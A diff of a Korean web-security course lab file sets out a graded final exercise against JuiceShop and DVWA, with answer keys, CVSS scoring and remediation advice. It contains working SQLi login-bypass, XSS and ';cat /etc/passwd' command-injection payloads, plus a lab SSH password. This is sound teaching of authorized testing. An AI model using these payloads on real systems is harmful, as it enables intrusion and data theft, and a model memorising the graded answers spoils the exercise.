@@ -4,36 +4,53 @@ version: standalone-web-vuln
 course: web-vuln
 week: 15
 description: |
-  기말 종합 — WSTG 한 바퀴: 정찰(nuclei)→인증 우회(SQLi/JWT)→주입(SQLi/XSS/RCE)→접근제어(A01)
-  →위험 평가(CVSS)→전문 보고. juice/dvwa 대상. 공격은 el34-attacker. 인가된 실습만. 명령은 el34 호스트에서.
+  기말 종합 침투 점검 — 한 명의 점검자가 el34 표적(JuiceShop/DVWA)에 WSTG 점검 한 사이클을 처음부터
+  끝까지 수행한다: ① 정찰(nuclei 기술/보안헤더 자동 매핑) → ② 인증 우회(로그인 SQLi → 관리자 JWT →
+  payload 디코드) → ③ 주입(SQLi/XSS/RCE 를 차단 모드 DVWA 에 보내 WAF 942/941/932 차단 확인) →
+  ④ 접근제어(무인증 관리 엔드포인트 + 강제 브라우징 /ftp = A01) → ⑤ 위험 평가(발견을 CVSS 3.1 로
+  정량화) → ⑥ 전문 보고(Executive Summary→발견(CVSS/PoC)→권고). 모든 명령은 el34
+  호스트(ssh ccc@192.168.0.151)에서 docker exec el34-attacker 로 실행하며, 인가된 표적 vhost
+  (juice.el34.lab / dvwa.el34.lab) 만 점검한다. "취약점을 찾았다"가 아니라 재현 가능한 증거로 보고한다.
 difficulty: hard
 duration_minutes: 200
 prerequisites:
-  - "W01–W14 통과"
-  - "el34 호스트 SSH + docker exec"
-  - "전 주차 점검·평가·보고 역량"
+  - "W01–W14 통과 (HTTP/정보수집·인증·주입·접근제어·위험 평가/보고 역량)"
+  - "el34 호스트 SSH(ssh ccc@192.168.0.151, 비밀번호 1) + docker exec 접근"
+  - "WSTG 점검 순서와 CVSS 3.1·전문 보고서 구조 이해(W08·W14)"
 objectives:
-  - "WSTG 전 과정 통합 수행"
-  - "발견을 CVSS로 정량화"
-  - "전문 침투 보고서 작성"
+  - "WSTG 점검 한 사이클(정찰→인증→주입→접근제어→위험 평가→보고)을 한 표적에 처음부터 끝까지 통합 수행한다"
+  - "각 발견을 CVSS 3.1 벡터로 정량화해 Critical~Medium 으로 자리매김한다"
+  - "발견→증거(PoC)→심각도→권고 구조의 전문 침투 보고서를 작성한다"
 pass_threshold: 0.7
 steps:
 
   - order: 1
     instruction: |
-      ## 🎯 점검 — 대상 도달
+      ## 🎯 점검(도달성) — 표적 JuiceShop 에 도달하나
+      ## 📖 개념 한 줄
+      점검의 전제는 "표적에 요청이 닿는다"는 것이다. 연결이 안 되면 이후 모든 음성 결과(취약점이
+      없어 보이는 것)가 무의미하므로, 점검자는 본격 점검 전에 항상 도달성부터 확인한다.
       ## 💻 실행 명령
       ```bash
       docker exec el34-attacker sh -c "curl -sk -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' http://10.20.30.1/"
       ```
+      ## 🔧 도구·옵션 풀이
+      - `curl` — 명령줄 HTTP 요청 도구. `-H 'Host: juice.el34.lab'` 로 어느 vhost(표적)인지 지정한다
+        (el34 web 의 Apache 가 Host 헤더로 라우팅).
+      - `-o /dev/null -w '%{http_code}'` — 본문은 버리고 **응답 코드만** 출력하는 관용구.
+      - `-sk` — 진행 표시 끄기(`-s`) + 자체서명 인증서 허용(`-k`).
+      - `http://10.20.30.1/` — fw 의 ext 게이트웨이. 요청은 fw → ips → web 경로로 흐른다.
       ## ✅ 합격 기준
-      대상 도달.
+      출력에 `juice=<코드>` 가 나타나면(표적 도달) 합격. 응답이 없거나 연결 실패면 Host 헤더·게이트웨이
+      주소부터 재확인한다.
     hint: '도달성'
     category: survey
     points: 8
     answer: |
       docker exec el34-attacker sh -c "curl -sk -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' http://10.20.30.1/"
-    answer_detail: "기말 종합 점검 대상 = juiceshop/dvwa."
+    answer_detail: "기말 종합 침투 점검의 표적 = JuiceShop(juice.el34.lab, 인증/접근제어용 탐지 모드) +
+      DVWA(dvwa.el34.lab, 주입 차단 시연용). 이 미션은 fw→web 경로로 표적에 HTTP 응답 코드가 돌아오는지
+      확인해 점검 가능 상태(scope alive)를 검증한다. 'juice' 가 출력에 보이면 도달."
     verify:
       type: output_contains
       expect: 'juice'
@@ -46,13 +63,24 @@ steps:
 
   - order: 2
     instruction: |
-      ## 🎯 정찰 — nuclei 기술/헤더
+      ## 🎯 ① 정찰 — nuclei 로 기술/보안헤더 자동 매핑
+      ## 📖 개념 한 줄
+      정찰(Recon)은 본격 점검 전에 표적의 표면(기술 스택·보안 헤더·경로)을 훑어 "어디를 찔러야 하나"의
+      지도를 그리는 단계다. 손으로 하나씩 보는 대신 자동 스캐너로 빠르게 다건을 매핑해 속도를 얻는다.
       ## 💻 실행 명령
       ```bash
       docker exec el34-attacker sh -c "nuclei -u http://10.20.30.1 -H 'Host: juice.el34.lab' -t /root/nuclei-templates/http/technologies/tech-detect.yaml -t /root/nuclei-templates/http/misconfiguration/http-missing-security-headers.yaml -silent -nc 2>/dev/null | head -8"
       ```
+      ## 🔧 도구·옵션 풀이
+      - `nuclei` — YAML 템플릿 기반 자동 점검 스캐너. "이런 요청 → 이런 응답이면 이 약점/기술"이라는
+        규칙을 템플릿으로 표적에 던진다. 템플릿은 attacker 의 `/root/nuclei-templates/` 아래에 있다.
+      - `-t .../technologies/tech-detect.yaml` — **기술 핑거프린팅**(표적이 무슨 서버·프레임워크인지).
+      - `-t .../misconfiguration/http-missing-security-headers.yaml` — **보안 헤더 누락**(CSP·HSTS 등
+        미적용을 탐지).
+      - `-silent` 배너 끄고 결과만, `-nc` 색 코드 없이. 출력된 각 줄이 곧 발견 1건이다.
       ## ✅ 합격 기준
-      자동 정찰로 기술/보안헤더 누락을 매핑한다.
+      기술/보안헤더 누락이 **다건**으로 매핑되면 합격. 0 건이면 템플릿 경로·Host 헤더를 재확인한다.
+      (정찰은 표면의 단서일 뿐, 악용 가능성은 다음 단계에서 입증한다.)
     hint: 'nuclei 정찰'
     category: recon
     points: 10
@@ -60,7 +88,9 @@ steps:
       echo "=== 정찰 (nuclei) ==="
       docker exec el34-attacker sh -c "nuclei -u http://10.20.30.1 -H 'Host: juice.el34.lab' -t /root/nuclei-templates/http/technologies/tech-detect.yaml -t /root/nuclei-templates/http/misconfiguration/http-missing-security-headers.yaml -silent -nc 2>/dev/null | tee /tmp/wv15n.txt | head -8; echo nuclei_findings=\$(wc -l < /tmp/wv15n.txt); rm -f /tmp/wv15n.txt"
       echo "→ 기술 핑거프린팅 + 보안 헤더 누락 자동 매핑(다건 탐지)"
-    answer_detail: "정찰 = nuclei로 기술/헤더 자동 매핑. 수동 정찰과 교차. 다건 탐지."
+    answer_detail: "정찰 = nuclei 의 기술 핑거프린팅 + 보안 헤더 누락 템플릿으로 표면을 자동 다건 매핑.
+      출력 줄 수(nuclei_findings)가 발견 건수다. 자동(속도) 정찰의 결과는 보고서의 Low~Medium 발견이자
+      이후 수동(정밀) 점검의 입력이 된다. 'nuclei_findings=' 표식이 출력되면 정찰 수행 인정."
     verify:
       type: output_contains
       expect: 'nuclei_findings='
@@ -73,13 +103,24 @@ steps:
 
   - order: 3
     instruction: |
-      ## 🎯 인증 우회 — 로그인 SQLi
+      ## 🎯 ② 인증 우회 — 로그인 SQLi 로 관리자 JWT 획득
+      ## 📖 개념 한 줄
+      인증은 가장 치명적인 점검 영역이다. 로그인 쿼리가 입력을 그대로 이어붙이면, 이메일 자리에 넣은
+      `' OR 1=1--` 이 조건을 **항상 참**으로 만들어 비밀번호 없이 첫 사용자(관리자)로 로그인된다 — SQLi
+      인증 우회(OWASP A07). 성공하면 서버가 JWT(서명된 로그인 토큰)를 발급한다.
       ## 💻 실행 명령
       ```bash
       docker exec el34-attacker sh -c 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json; curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv15.json http://10.20.30.1/rest/user/login | head -c 100; rm -f /tmp/wv15.json'
       ```
+      ## 🔧 도구·옵션 풀이
+      - 앞의 base64 문자열은 `{"email":"' OR 1=1--","password":"x"}` 를 담은 것 — 이메일 자리에 SQLi
+        조각을 넣은 로그인 본문이다. `base64 -d` 로 디코드해 임시 JSON 파일로 만든다.
+      - `-d @/tmp/wv15.json` — 그 JSON 을 POST 본문으로 전송, `-H "Content-Type: application/json"` 으로
+        JSON 임을 명시. 표적은 JuiceShop 의 로그인 API `/rest/user/login`.
+      - `head -c 100` — 응답 앞부분만 확인(토큰 구조가 보이는지). 끝에 임시 파일을 정리한다.
       ## ✅ 합격 기준
-      로그인 SQLi 우회로 JWT 획득.
+      응답 본문에 `authentication`(토큰을 담은 구조)이 나타나면 인증 우회 성공. 안 나오면 페이로드
+      base64·Content-Type 을 점검한다. (얻은 권한으로 데이터를 조작하지 않는다 — 입증까지만.)
     hint: "' OR 1=1-- → token"
     category: manipulation
     points: 12
@@ -87,7 +128,9 @@ steps:
       echo "=== 인증 우회 (로그인 SQLi) ==="
       docker exec el34-attacker sh -c 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json; curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv15.json http://10.20.30.1/rest/user/login | head -c 120; rm -f /tmp/wv15.json'
       echo ""
-    answer_detail: "인증 우회 = ' OR 1=1-- → admin JWT(A07)."
+    answer_detail: "인증 우회 = 로그인 API 이메일 자리에 ' OR 1=1-- 를 주입 → 조건이 항상 참이 되어
+      관리자 JWT 발급(OWASP A07 식별·인증 실패). 응답에 'authentication'(토큰 구조)이 보이면 우회 성공.
+      위험 평가에서 무인증·원격·쉬운 악용이라 9.8 Critical, 근본 방어는 parameterized query."
     verify:
       type: output_contains
       expect: 'authentication'
@@ -100,13 +143,24 @@ steps:
 
   - order: 4
     instruction: |
-      ## 🎯 JWT 분석
+      ## 🎯 ② JWT 분석 — payload 노출 확인
+      ## 📖 개념 한 줄
+      JWT 는 `헤더.payload.서명` 세 조각이 점(.)으로 이어진 토큰이다. 가운데 **payload 는 암호화가
+      아니라 단순 base64 인코딩**일 뿐이라, 누구나 디코드해 안의 값(이메일·권한)을 읽을 수 있다 — payload
+      에 민감 정보를 담으면 그 자체가 정보 노출(A02)이다.
       ## 💻 실행 명령
       ```bash
       docker exec el34-attacker sh -c 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json; T=$(curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv15.json http://10.20.30.1/rest/user/login | sed -E "s/.*\"token\":\"([^\"]+)\".*/\1/"); echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null | head -c 150; rm -f /tmp/wv15.json'
       ```
+      ## 🔧 도구·옵션 풀이
+      - 미션 3 처럼 인증 우회로 로그인하되, `sed -E "s/.*\"token\":\"([^\"]+)\".*/\1/"` 로 응답에서
+        `token` 값만 추출해 변수 `T` 에 담는다.
+      - `cut -d. -f2` — JWT 의 **두 번째 조각(payload)** 만 잘라낸다(점 기준 2번째).
+      - `tr "_-" "/+"` — JWT 는 base64**url** 변형이라 `-`/`_` 를 표준 base64 의 `+`/`/` 로 되돌린 뒤
+        `base64 -d` 로 디코드한다. `head -c 150` 으로 앞부분만 본다.
       ## ✅ 합격 기준
-      JWT payload(email) 노출 확인.
+      디코드 결과에 `email` 등 payload 필드가 보이면 합격(서명 검증 전 평문 노출 입증). 깨지면 token
+      추출과 base64url→base64 변환(`-`/`_`→`/`/`+`)을 점검한다.
     hint: 'JWT 디코드'
     category: analysis
     points: 10
@@ -114,7 +168,10 @@ steps:
       echo "=== JWT payload 분석 ==="
       docker exec el34-attacker sh -c 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json; T=$(curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv15.json http://10.20.30.1/rest/user/login | sed -E "s/.*\"token\":\"([^\"]+)\".*/\1/"); echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null | head -c 200; rm -f /tmp/wv15.json'
       echo ""
-    answer_detail: "JWT payload base64 디코드 → email 노출(서명 검증 전 평문)."
+    answer_detail: "JWT 의 가운데 조각(payload)을 base64url→base64 변환 후 디코드하면 email 등이 평문
+      노출된다 — payload 는 암호화가 아니라 인코딩일 뿐이므로 서명 검증과 무관하게 누구나 읽는다.
+      'email' 이 보이면 정보 노출(A02) 입증. JWT 점검의 기본이며, payload 민감정보·alg:none·약한 서명키는
+      토큰 위조/노출로 이어진다."
     verify:
       type: output_contains
       expect: 'email'
@@ -127,13 +184,24 @@ steps:
 
   - order: 5
     instruction: |
-      ## 🎯 주입 — SQLi/XSS (WAF 탐지)
+      ## 🎯 ③ 주입 — SQLi / XSS (차단 모드 DVWA 에서 WAF 403 확인)
+      ## 📖 개념 한 줄
+      주입(OWASP A03)은 앱이 입력을 검증 없이 신뢰할 때 생긴다. SQLi 는 SQL 문법을(`' OR '1'='1`), XSS 는
+      스크립트를(`<script>...`) 입력에 끼워 넣는 공격이다. 여기서는 **차단 모드** 표적 DVWA 로 보내 WAF
+      (ModSecurity CRS)가 어떻게 막는지(403)를 직접 본다.
       ## 💻 실행 명령
       ```bash
       docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'sqli=%{http_code} ' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20OR%20%271%27=%271\"; curl -s -o /dev/null -w 'xss=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?q=%3Cscript%3Ealert(1)%3C/script%3E\""
       ```
+      ## 🔧 도구·옵션 풀이
+      - `Host: dvwa.el34.lab` — 표적을 **DVWA**(차단 모드)로 지정. JuiceShop(탐지만)과 달리 공격을 막는다.
+      - SQLi 페이로드 `?id=1' OR '1'='1`(URL 인코딩 `%27`=`'`)는 ModSec CRS **942**(SQLi) 룰군에 걸린다.
+      - XSS 페이로드 `?q=<script>alert(1)</script>`(인코딩됨)는 CRS **941**(XSS) 룰군에 걸린다.
+      - `-o /dev/null -w 'sqli=%{http_code} xss=...'` — 응답 코드만 라벨과 함께 출력한다.
       ## ✅ 합격 기준
-      SQLi/XSS 주입이 WAF(403)에 탐지·차단된다.
+      `sqli=403 xss=403` 이면 WAF 차단 확인(합격). 200 이 나오면 표적/모드(dvwa vs juice)를 재확인한다.
+      ⚠️ 핵심 — 403(차단)은 WAF 가 패턴을 막은 것이지 **앱이 안전해진 것은 아니다**(근본 방어는 입력
+      검증·parameterized query, 미션 9).
     hint: 'SQLi/XSS 403'
     category: manipulation
     points: 12
@@ -141,7 +209,9 @@ steps:
       echo "=== 주입 (SQLi/XSS) ==="
       docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'sqli=%{http_code} ' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20OR%20%271%27=%271\"; curl -s -o /dev/null -w 'xss=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?q=%3Cscript%3Ealert(1)%3C/script%3E\""
       echo "→ dvwa는 ModSec 942(SQLi)/941(XSS) 차단형 403"
-    answer_detail: "주입 = SQLi(942)/XSS(941) 시도. dvwa는 차단형 → 403."
+    answer_detail: "주입(A03) = SQLi(CRS 942)·XSS(CRS 941) 페이로드를 차단 모드 DVWA 에 전송 → WAF 가
+      403 으로 차단. 'sqli=' 표식 + 403 응답으로 차단 확인. 차단은 WAF 의 보완 방어일 뿐 근본 방어
+      (parameterized query·출력 인코딩+CSP)는 아니다. 같은 입력을 JuiceShop(탐지만)에 보내면 200 통과."
     verify:
       type: output_contains
       expect: 'sqli='
@@ -154,13 +224,23 @@ steps:
 
   - order: 6
     instruction: |
-      ## 🎯 RCE 시도 — 명령주입
+      ## 🎯 ③ RCE 시도 — 명령주입 (최고 심각도)
+      ## 📖 개념 한 줄
+      RCE(Remote Code Execution, 원격 코드 실행)는 입력에 OS 명령을 끼워(예: `;` 로 명령을 이어 붙임)
+      표적 서버에서 공격자의 명령을 실행시키는 것이다. 성공 시 **시스템 완전 장악**으로 이어지는 가장
+      심각한 주입 결과다. 여기서도 차단 모드 DVWA 로 보내 WAF 차단을 확인한다.
       ## 💻 실행 명령
       ```bash
       docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'rce=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=1;cat%20/etc/passwd'"
       ```
+      ## 🔧 도구·옵션 풀이
+      - 페이로드 `?q=1;cat /etc/passwd`(인코딩 `%20`=공백) — `;` 는 셸에서 **명령 연결자**다. 앱이 입력을
+        OS 명령으로 넘기면 `1` 다음에 `cat /etc/passwd` 가 이어 실행된다(계정 파일 노출 시도).
+      - `Host: dvwa.el34.lab` — 차단 모드 표적. 이 RCE 패턴은 ModSec CRS **932**(RCE) 룰군에 걸린다.
+      - `-o /dev/null -w 'rce=%{http_code}'` — 응답 코드만 출력.
       ## ✅ 합격 기준
-      명령주입(RCE) 시도가 탐지된다.
+      `rce=403` 이면 WAF(932)가 명령주입을 차단한 것(합격). 200 이면 표적/모드를 재확인한다. RCE 는
+      성공 시 완전 장악이라 위험 평가에서 SQLi 와 함께 **Critical(9.8)** 로 자리매김한다.
     hint: ';cat /etc/passwd'
     category: manipulation
     points: 12
@@ -168,7 +248,9 @@ steps:
       echo "=== RCE 시도 (명령주입) ==="
       docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'rce=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=1;cat%20/etc/passwd'"
       echo "→ ;cmd = OS 명령 연결. ModSec 932(RCE) 탐지. 성공 시 완전 장악(최고 심각도)"
-    answer_detail: "RCE = 명령주입(;cmd). ModSec 932 탐지. 가장 심각한 등급."
+    answer_detail: "RCE = 명령주입(;cmd 로 OS 명령 연결). 차단 모드 DVWA 에서 ModSec CRS 932(RCE) 룰군이
+      잡아 403 차단. 'rce=' 표식으로 시도 확인. 성공 시 시스템 완전 장악이라 SQLi 와 함께 최고 심각도
+      (9.8 Critical), 근본 방어는 OS 호출 회피(안전한 API)+입력 allowlist."
     verify:
       type: output_contains
       expect: 'rce='
@@ -181,13 +263,24 @@ steps:
 
   - order: 7
     instruction: |
-      ## 🎯 접근제어 — 무인증 관리/강제 브라우징
+      ## 🎯 ④ 접근제어 — 무인증 관리 엔드포인트 + 강제 브라우징
+      ## 📖 개념 한 줄
+      접근제어(Access Control)는 "누가 무엇에 접근 가능한가"를 서버가 **요청마다** 검사하는 것이다. 검사를
+      화면(버튼 숨김)에만 의존하고 서버에서 빼먹으면, 누구나 관리 기능을 호출한다 — OWASP A01(Broken
+      Access Control, 2021 Top 10 1 위). 강제 브라우징은 링크에 없는 경로(`/ftp`)를 직접 호출하는 점검이다.
       ## 💻 실행 명령
       ```bash
       docker exec el34-attacker sh -c "curl -sk -o /dev/null -w 'admincfg=%{http_code} ' -H 'Host: juice.el34.lab' http://10.20.30.1/rest/admin/application-configuration; curl -sk -o /dev/null -w 'ftp=%{http_code}\n' -H 'Host: juice.el34.lab' http://10.20.30.1/ftp"
       ```
+      ## 🔧 도구·옵션 풀이
+      - `/rest/admin/application-configuration` — JuiceShop 의 **관리용** 엔드포인트. 인증 토큰 없이 호출
+        한다(요청에 Authorization 헤더가 없음에 주목).
+      - `/ftp` — 화면 링크에 없는 숨은 경로. URL 을 직접 입력해 접근을 시도하는 **강제 브라우징**.
+      - `-o /dev/null -w 'admincfg=%{http_code} ftp=...'` — 두 경로의 응답 코드만 라벨과 함께 출력.
       ## ✅ 합격 기준
-      무인증 관리(200)/강제 브라우징을 확인한다.
+      `admincfg=200`(인증 없이 관리 설정 노출 = A01)이면 합격. `/ftp` 도 접근되면 강제 브라우징 증거가
+      더해진다. 401/403 이 나오면 접근제어가 동작하는 것이니 표적/경로를 재확인한다. (노출된 설정으로
+      실제 시스템을 조작하지 않는다 — 입증까지만.)
     hint: 'admin-config/ftp'
     category: manipulation
     points: 12
@@ -195,7 +288,10 @@ steps:
       echo "=== 접근제어 (A01) ==="
       docker exec el34-attacker sh -c "curl -sk -o /dev/null -w 'admincfg=%{http_code} ' -H 'Host: juice.el34.lab' http://10.20.30.1/rest/admin/application-configuration; curl -sk -o /dev/null -w 'ftp=%{http_code}\n' -H 'Host: juice.el34.lab' http://10.20.30.1/ftp"
       echo "→ admin-config 200(무인증 관리 노출) + /ftp 강제 브라우징 = A01"
-    answer_detail: "접근제어 = 무인증 관리(admin-config 200) + 강제 브라우징(/ftp). A01."
+    answer_detail: "접근제어 실패(OWASP A01) = 인증 없이 관리 엔드포인트(/rest/admin/application-
+      configuration)가 200 으로 설정 노출 + 강제 브라우징(/ftp) 접근. admincfg=200 이 핵심 증거.
+      서버가 요청마다 객체수준 인가를 강제하지 않아 발생하며, 위험 평가에서 7.5 High, 근본 방어는
+      서버측 인가 + 기본 deny."
     verify:
       type: output_contains
       expect: 'admincfg=200'
@@ -208,13 +304,23 @@ steps:
 
   - order: 8
     instruction: |
-      ## 🎯 위험 평가 — CVSS
+      ## 🎯 ⑤ 위험 평가 — 발견을 CVSS 3.1 로 정량화
+      ## 📖 개념 한 줄
+      발견을 나열만 하면 "무엇부터 고쳐야 하나"를 알 수 없다. CVSS(Common Vulnerability Scoring System)
+      3.1 로 각 발견에 0~10 점수를 매겨 Critical~Low 로 줄세워야 우선순위가 선다(W14 의 실전 적용).
       ## 💻 실행 명령
       ```bash
       echo "SQLi/RCE: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical"
       ```
+      ## 🔧 CVSS 벡터 읽기
+      - `AV:N`(네트워크에서) · `AC:L`(쉽게) · `PR:N`(권한 없이) · `UI:N`(사용자 개입 없이) ·
+        `S:U`(범위 불변) · `C:H/I:H/A:H`(기밀·무결·가용성 모두 크게 훼손) → **9.8 Critical**.
+      - 무인증 원격 SQLi(인증 우회)·RCE 가 정확히 이 벡터라 9.8 이 된다.
+      - 등급: 9.0+ Critical / 7.0+ High / 4.0+ Medium / 0.1+ Low.
       ## ✅ 합격 기준
-      발견을 CVSS로 정량화한다.
+      발견이 CVSS 로 정량화되어 출력되면 합격(예: SQLi/RCE=9.8 Critical, A01=7.5 High, XSS/정보 노출=
+      6.1/5.3 Medium). 점수 `9.8` 이 보이면 정량화 인정. 등급 근거가 없으면 C/I/A 영향과 AV/AC/PR/UI
+      난이도를 다시 따진다.
     hint: 'CVSS 9.8'
     category: analysis
     points: 12
@@ -225,7 +331,9 @@ steps:
       echo "접근제어 A01: 7.5 High"
       echo "XSS/정보노출: 6.1/5.3 Medium"
       echo "→ Critical 2 + High 1 + Medium 2"
-    answer_detail: "위험 평가 = CVSS 3.1 정량화. 무인증 원격 SQLi/RCE = 9.8 Critical."
+    answer_detail: "위험 평가 = 발견을 CVSS 3.1 벡터로 정량화해 줄세움. 무인증 원격 SQLi(인증 우회)/RCE
+      = AV:N/AC:L/PR:N/UI:N/C:H/I:H/A:H = 9.8 Critical, 접근제어 A01 = 7.5 High, XSS/정보 노출 =
+      6.1/5.3 Medium. 등급 분포 Critical 2 + High 1 + Medium 2. '9.8' 점수가 보이면 정량화 인정."
     verify:
       type: output_contains
       expect: '9.8'
@@ -238,13 +346,24 @@ steps:
 
   - order: 9
     instruction: |
-      ## 🎯 권고 — 발견별 조치
+      ## 🎯 ⑥ 권고 — 발견별 근본 조치 + 우선순위
+      ## 📖 개념 한 줄
+      보고서의 가치는 "고치는 길"을 제시하는 데 있다. 발견마다 WAF 차단 같은 완화가 아니라 **근본 방어**를
+      짚고, 심각도순 우선순위로 묶어 의뢰인이 무엇부터 할지 알게 한다.
       ## 💻 실행 명령
       ```bash
       echo "SQLi:파라미터화, XSS:인코딩+CSP, RCE:입력검증, A01:서버측인가, 정보노출:generic에러"
       ```
+      ## 🔧 발견별 근본 권고
+      - **SQLi**(인증 우회 포함) → parameterized query(쿼리와 데이터 분리)가 근본.
+      - **XSS** → 문맥별 출력 인코딩 + CSP(Content-Security-Policy).
+      - **RCE**(명령주입) → OS 호출 회피(안전한 API) + 입력 allowlist.
+      - **A01**(접근제어) → 서버측 객체수준 인가 + 기본 deny.
+      - **정보 노출/헤더** → generic 에러 + 배너 억제 + 보안 헤더(HSTS/CSP) 추가.
+      - **우선순위**: Critical 2(SQLi/RCE) 즉시 → A01(High) → Medium.
       ## ✅ 합격 기준
-      발견별 구체 권고를 제시한다.
+      발견별 구체 권고와 우선순위가 제시되면 합격. `파라미터화` 등 근본 권고 키워드가 보이면 인정.
+      우선순위 근거(심각도)가 없으면 미션 8 의 등급과 연결한다.
     hint: '파라미터화/인가'
     category: report
     points: 10
@@ -256,7 +375,9 @@ steps:
       echo "A01: 서버측 객체수준 인가 + 기본 deny"
       echo "정보 노출: generic 에러 + 배너 억제, 보안 헤더(HSTS/CSP) 추가"
       echo "→ 우선순위: Critical 2(SQLi/RCE) 즉시 → A01 → Medium"
-    answer_detail: "권고 = 발견별 구체 조치 + 우선순위. 파라미터화/인코딩/인가/generic에러."
+    answer_detail: "권고 = 발견별 근본 방어(WAF 완화가 아닌) + 심각도순 우선순위. SQLi=파라미터화,
+      XSS=출력 인코딩+CSP, RCE=OS 호출 회피+allowlist, A01=서버측 인가+기본 deny, 정보 노출=generic
+      에러+보안 헤더. 우선순위 Critical 2(SQLi/RCE) 즉시 → A01 → Medium. '파라미터화' 키워드로 권고 인정."
     verify:
       type: output_contains
       expect: '파라미터화'
@@ -269,7 +390,11 @@ steps:
 
   - order: 10
     instruction: |
-      ## 🎯 전문 침투 보고서
+      ## 🎯 ⑥ 전문 침투 보고서 — 점검 한 사이클의 총결산
+      ## 📖 개념 한 줄
+      점검의 산출물은 보고서다. 미션 1–9 의 발견을 **Executive Summary(경영진용 위험 한 문단) → 범위/
+      방법론(WSTG) → 발견 상세(CVSS·PoC·권고) → 우선순위/결론** 구조의 한 문서로 종합해야 점검 한 사이클이
+      완성된다. 핵심은 "있다"가 아니라 "이렇게 재현되고(PoC), 이만큼 위험하며(CVSS), 이렇게 막는다(권고)".
       ## 💻 보고서 양식
       ```markdown
       # 웹 침투 점검 기말 보고서 (학번, 이름)
@@ -278,8 +403,16 @@ steps:
       ## 3. 발견(CVSS/PoC/권고)
       ## 4. 우선순위 + 결론
       ```
+      ## 🔧 작성 지침
+      - **Executive Summary**: 등급 분포(Critical 2/High 1/Medium 2)와 핵심 위험(무인증 원격 데이터
+        침해·시스템 장악)을 비전문가도 읽게 한 문단으로.
+      - **발견 상세**: 발견마다 심각도순으로 CVSS 점수 + PoC(재현 절차, 예: `' OR 1=1--` → 관리자 JWT) +
+        근본 권고를 함께 적는다.
+      - **우선순위/결론**: Critical 2(SQLi/RCE) → A01 → Medium 순. "점검→CVSS 정량화→재현 가능 보고로
+        행동 가능하게" 로 마무리.
       ## ✅ 합격 기준
-      Executive~발견(CVSS/PoC)~권고를 갖춘 전문 보고서를 작성한다.
+      Executive Summary ~ 발견(CVSS/PoC) ~ 권고 ~ 우선순위/결론을 모두 갖춘 전문 보고서면 합격. 'CVSS'
+      가 포함되고 각 발견에 재현 절차(PoC)가 있으면 인정. 증거 없는 주장만 있으면 PoC 를 보강한다.
     hint: 'Exec/CVSS/PoC/권고'
     category: report
     points: 10
@@ -295,7 +428,9 @@ steps:
       ##   - XSS/정보노출 Medium: 권고(인코딩+CSP/generic 에러)
       ## 4. 우선순위: Critical 2 → A01 → Medium. 결론: 점검→CVSS 정량화→재현가능 보고로 행동 가능하게
       EOF
-    answer_detail: "전문 보고서 = Exec Summary + 방법론(WSTG) + 발견(CVSS/PoC/권고) + 우선순위. 한 학기 통합."
+    answer_detail: "전문 침투 보고서 = Executive Summary(등급 분포·핵심 위험) + 범위/방법론(WSTG) +
+      발견 상세(심각도순, 각 발견에 CVSS·PoC·근본 권고) + 우선순위/결론. 'CVSS' 와 재현 절차(PoC)가
+      포함되면 인정. 한 학기 점검 역량을 의뢰인이 행동할 수 있는 하나의 산출물로 종합한 것이 수료의 핵심."
     verify:
       type: output_contains
       expect: 'CVSS'
